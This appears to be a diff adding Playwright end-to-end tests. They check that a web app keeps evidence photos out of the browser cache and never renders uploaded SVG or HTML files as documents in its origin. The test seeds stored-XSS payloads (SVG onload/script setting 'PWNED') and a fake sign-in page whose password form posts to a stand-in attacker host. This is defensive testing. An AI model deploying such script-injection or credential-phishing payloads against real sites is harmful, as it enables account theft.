@@ -2388,6 +2388,19 @@ async function main() {
     c.expect(!(await toastSeen(page, /PDF export failed/, 500)), "no 'PDF export failed' toast");
     await page.waitForTimeout(1500);
     await shot(c, page, "exported");
+    // C7: neither the thumbnail's nor the export's download may stay in the
+    // browser's HTTP cache (it outlives the session, on disk). A
+    // force-cache fetch of the same address is answered from that cache
+    // when a copy exists — it reaches the gateway only if none was kept.
+    const evRow = await one("SELECT file_path FROM evidences WHERE item_id = $1 AND file_name = 'tiny.png' ORDER BY created_at DESC LIMIT 1", [ID.evidence]);
+    const sess = await sessionFromCookies(page);
+    const tProbe = Date.now();
+    const probe = await page.evaluate(async ({ u, tok, key }) => {
+      const r = await fetch(u, { cache: "force-cache", headers: { Authorization: `Bearer ${tok}`, apikey: key } });
+      return r.status;
+    }, { u: `${GW}/storage/v1/object/evidence-photos/${evRow?.file_path}`, tok: sess?.access_token, key: process.env.ANON_KEY }).catch((e) => e.message);
+    const probeHits = (await ctl.log(tProbe)).filter((l) => l.method === "GET" && evRow && l.url.split("?")[0].endsWith(evRow.file_path));
+    c.expect(probe === 200 && probeHits.length === 1, "the photo is not in the browser's HTTP cache after the thumbnail and the export (cache: no-store)", { probe, probeHits });
     await page.context().close();
     await sql("DELETE FROM evidences WHERE item_id = $1", [ID.evidence]).catch(() => {});
   });
@@ -4714,6 +4727,110 @@ async function main() {
       await ctx.close();
     } finally {
       await ctl.clear();
+      await dropItems([ITEM]);
+    }
+  });
+
+  // A file whose stored type is a document (SVG, HTML) must never become a
+  // blob: document in the app's origin — neither as a thumbnail (which
+  // "Open image in new tab" would navigate to) nor in the tab the app
+  // opens. The bucket's allowed_mime_types normally refuses these; here it
+  // is lifted, as on a bucket created before that list existed (the
+  // baseline's INSERT ... ON CONFLICT DO NOTHING keeps an older bucket as
+  // is) or if the list is ever widened.
+  await run("c7unsafe", "C7: SVG/HTML stored as evidence are never rendered as documents in the app's origin (no blob: of that type, no script, 'file type not allowed')", async (c) => {
+    const ITEM = "00000000-0000-0000-0000-0000000ec702";
+    const NAME = "E2E C7 Unsafe Target";
+    await sql(
+      `INSERT INTO items (id, unit_id, zone_id, name, status, prob, cons, created_by)
+       VALUES ($1, $2, 'Z13', $3, 'Attention', 2, 2, $4) ON CONFLICT (id) DO NOTHING`,
+      [ITEM, await unitId(), NAME, USERS.insp1]
+    );
+    const mimes = (await one("SELECT allowed_mime_types FROM storage.buckets WHERE id = 'evidence-photos'")).allowed_mime_types;
+    await sql("UPDATE storage.buckets SET allowed_mime_types = NULL WHERE id = 'evidence-photos'");
+    try {
+      const pwn = "try{(opener||parent).document.title='PWNED'}catch(e){};document.title='PWNED';window.__pwned=1";
+      const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" onload="${pwn}"><script>${pwn}</script><rect width="32" height="32" fill="red"/></svg>`;
+      const html = `<!doctype html><title>Session expired</title><script>${pwn}</script><h1>Sign in again</h1><form action="https://attacker.invalid/"><input name="password" type="password"></form>`;
+      // [file name, stored Content-Type, evidences.file_type, bytes]
+      const files = [
+        ["evil.svg", "image/svg+xml", "image/svg+xml", svg],
+        ["evil.png", "text/html", "image/png", html], // lies about its type
+        ["evil-doc.pdf", "text/html", "application/pdf", html],
+        ["ok.png", "image/png", "image/png", tinyPng({ tint: 40 })],
+      ];
+      const api = await apiAs("insp1@test.local");
+      for (const [name, ctype, ftype, data] of files) {
+        const p = `${ITEM}/e2e_${Date.now()}_${name}`;
+        const up = await api.storage.from("evidence-photos").upload(p, new Blob([data], { type: ctype }), { contentType: ctype });
+        const ins = await api.from("evidences").insert({
+          item_id: ITEM, evidence_date: new Date().toISOString().slice(0, 10), description: `C7 unsafe ${name}`,
+          file_path: p, file_name: name, file_type: ftype, file_size: data.length,
+        });
+        if (up.error || ins.error) throw new Error(`seed ${name}: ${up.error?.message || ins.error?.message}`);
+      }
+
+      const page = await newPage(c, "insp1-c7u");
+      const ctx = page.context();
+      await ctx.addInitScript(() => {
+        window.__c7 = { created: [] };
+        const oc = URL.createObjectURL;
+        URL.createObjectURL = function (b) {
+          const u = oc.call(URL, b);
+          window.__c7.created.push({ u, type: b && b.type });
+          return u;
+        };
+      });
+      const pages = [];
+      ctx.on("page", (p) => pages.push(p));
+      await login(page, "insp1@test.local");
+      await openItem(page, NAME);
+      const ok = modal(page).locator('img[alt="ok.png"]');
+      await ok.waitFor({ timeout: 15000 }).catch(() => {});
+      c.expect(await ok.evaluate((el) => el.complete && el.naturalWidth === 32 && el.src.startsWith("blob:")).catch(() => false), "a real photo next to them still renders (blob:, naturalWidth=32)");
+      for (const n of ["evil.svg", "evil.png"]) {
+        const msg = modal(page).getByText(`${n} can't be shown: file type not allowed.`);
+        await msg.waitFor({ timeout: 15000 }).catch(() => {});
+        c.expect(await msg.isVisible(), `${n}: 'can't be shown: file type not allowed.'`);
+        c.expect((await modal(page).locator(`img[alt="${n}"]`).count()) === 0, `${n}: no thumbnail`);
+      }
+      c.expect((await modal(page).getByRole("button", { name: "Try again" }).count()) === 0, "…and no 'Try again' (retrying can't help)");
+      await shot(c, page, "blocked");
+      // Were a thumbnail shown anyway, opening it is the attack: do it, so
+      // the checks below see the resulting document.
+      for (const n of ["evil.svg", "evil.png"]) {
+        const t = modal(page).locator(`img[alt="${n}"]`);
+        if (!(await t.count())) continue;
+        const [p] = await Promise.all([page.waitForEvent("popup", { timeout: 10000 }).catch(() => null), t.click()]);
+        await p?.waitForURL(/^blob:/, { timeout: 5000 }).catch(() => {});
+        await page.waitForTimeout(500);
+      }
+
+      // The attachment whose bytes are HTML: the tab opened for it closes.
+      const [pop] = await Promise.all([
+        page.waitForEvent("popup", { timeout: 10000 }),
+        modal(page).getByRole("button", { name: "Attachment: evil-doc.pdf" }).click(),
+      ]);
+      await pop.waitForEvent("close", { timeout: 15000 }).catch(() => {});
+      c.expect(pop.isClosed(), "the tab opened for the HTML 'PDF' is closed again, never shown");
+      const msg = modal(page).getByText("evil-doc.pdf can't be shown: file type not allowed.");
+      await msg.waitFor({ timeout: 5000 }).catch(() => {});
+      c.expect(await msg.isVisible(), "evil-doc.pdf: 'can't be shown: file type not allowed.'");
+
+      const created = (await page.evaluate(() => window.__c7.created)) || [];
+      const bad = created.filter((x) => !/^(image\/(png|jpeg|webp|gif|avif|heic|heif)|application\/pdf)$/.test(x.type || ""));
+      c.expect(created.length > 0 && bad.length === 0, "every object URL the app made has an image/PDF type — none of SVG, HTML or unknown type", created);
+      const docs = [];
+      for (const p of pages) {
+        if (p.isClosed()) continue;
+        docs.push(await p.evaluate(() => ({ url: location.href, type: document.contentType, title: document.title, pwned: !!window.__pwned })).catch(() => null));
+      }
+      c.expect(docs.every((d) => d && !d.pwned && d.title !== "PWNED" && !(d.url.startsWith("blob:") && /html|svg|xml/.test(d.type))),
+        "no page runs the stored script or shows an SVG/HTML blob: document", docs);
+      await page.keyboard.press("Escape");
+      await ctx.close();
+    } finally {
+      await sql("UPDATE storage.buckets SET allowed_mime_types = $1 WHERE id = 'evidence-photos'", [mimes]);
       await dropItems([ITEM]);
     }
   });
